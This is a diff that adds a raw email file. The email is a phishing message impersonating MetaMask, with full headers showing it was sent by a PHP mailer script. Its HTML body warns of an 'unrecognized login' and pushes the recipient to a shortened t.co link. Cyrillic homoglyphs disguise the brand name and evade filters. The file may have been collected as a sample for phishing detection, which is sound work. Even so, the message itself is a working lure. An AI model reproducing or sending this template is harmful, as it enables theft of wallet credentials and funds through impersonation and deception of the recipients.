@@ -1,0 +1,128 @@
+Return-Path: <postmaster@8bad848c31.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id mEyLEuPyQGg5SgAAOB6+FQ
+	(envelope-from <postmaster@8bad848c31.nxcli.io>)
+	for <info@vorteksenerji.com>; Thu, 05 Jun 2025 04:29:07 +0300
+Return-path: <postmaster@8bad848c31.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Thu, 05 Jun 2025 04:29:07 +0300
+Received: from cloudhost-927119.us-west-1.nxcli.net ([173.249.144.36]:31638)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@8bad848c31.nxcli.io>)
+	id 1uMzPm-000000004t0-3xxg
+	for info@vorteksenerji.com;
+	Thu, 05 Jun 2025 04:29:07 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=8bad848c31.nxcli.io;
+  b=hyGG0OIuH+VxcsBxYL+bAnH2cqQ/VBcbvmq3ebZuC0MkcTmjdyKHilGlldWJI4BmyQlXmGLhhPFhJ7glGzdG05aCr2WFIsQVtpoxzAU6MuDGf0gKvmtUPzHCj187q/oRC5pB66+hqxQmfVwxRDzXs7oStXNFfGlDEnIVMxFuUapQv7wVSk75vRrH4xF9kP5XfwQOnn3ygBsFof7DQ3EkpUMlvRQiK611AdOudTP4vwaHdO8WL3wRNpMpfsgw5+H5rDI3Ppnm9uhIJVr4yJPqsIY2c2XsoK9dv8ah2goPmFDfwUQhH3DK2E4CRS8JEmDj4+w9ioj94mzfXc7P4CMEZw==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type:X-Mailer:X-Priority;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=8bad848c31.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type; s=default; bh=ImW1u44qS6BlD8b8yQG/eQlu8MTnidu9Alj
+	mbsA1GpQ=; b=Dh8QhpM2/Pdyol0HzM5bpt4sHJm8NtkNiIAKkn0/3jl0TGd/Mmp
+	ByAYTXjW+d50RGePeLBrQm/hGHZYE5qIUnyaBcfQCmpqM+PqaflYSoB2aUp+kdB1
+	Dtx6Noj/BVdfU3CSXBIh8R1DbPIVyNkUoRK5koiWErM8tJVTWc+JolcuVRuppo77
+	mVK/zwrVmhs3vqM10N7Bdm66NnaJgWL1pRAun6bGRNlF+PAsHFhRnG2FnK/4ZjCK
+	ubRNHFBJ2KAvAyyu4de+PulukWnTsIuCwY7tDEGib9HFlLtMg02vvfMsIL4xUine
+	iYKld4NU3KLl8H1/0s8M5Zv4aSo0V49+aGQ==
+Received: (qmail 22766 invoked by uid 10226); 5 Jun 2025 01:28:24 +0000
+Date: 5 Jun 2025 01:28:24 +0000
+Message-ID: <20250605012824.22763.qmail@cloudhost-927119.us-west-1.nxcli.net>
+To: info@vorteksenerji.com
+Subject: Security Notification
+X-PHP-Originating-Script: 10226:bin.php
+From: "MetaMаsk" <76rbi59q@xqk.io>
+Reply-To: 76rbi59q@xqk.io
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHP/8.2.20
+X-Priority: 3
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>MetаMаsk Ѕесurіtу Аlеrt</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 30px 0;
+      background-color: #f4f5f7;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      color: #333;
+    }
+    .card {
+      max-width: 540px;
+      margin: auto;
+      background-color: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.06);
+      padding: 30px 28px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 58px;
+    }
+    h2 {
+      font-size: 22px;
+      color: #f6851b;
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    p {
+      font-size: 15px;
+      line-height: 1.6;
+      text-align: center;
+      margin: 0 0 16px;
+    }
+    .action {
+      text-align: center;
+      margin: 28px 0;
+    }
+    .action a {
+      background-color: #f6851b;
+      color: #ffffff;
+      padding: 12px 30px;
+      font-size: 15px;
+      font-weight: 600;
+      text-decoration: none;
+      border-radius: 8px;
+      display: inline-block;
+    }
+    .footer {
+      font-size: 12px;
+      color: #999;
+      text-align: center;
+      margin-top: 22px;
+      line-height: 1.4;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetаMаsk Logo">
+    </div>
+    <h2>Unrecognized Lоgіn Attempt</h2>
+    <p>Yоur wallet was accessed from a location or device we don’t recognize.</p>
+    <p>To protect your assets, please verify this activity immediately.</p>
+    <div class="action">
+      <a href="https://t.co/toFYARpSyb?id=-584117447783022643-4214">🔐 Review Lоgіn</a>
+    </div>
+    <div class="footer">
+      If this was you, no further action is needed.<br>
+      Thank you for helping keep your wallet secure.<br><br>
+      — MetаMаsk Ѕесurіtу Team
+    </div>
+  </div>
+</body>
+</html>
+
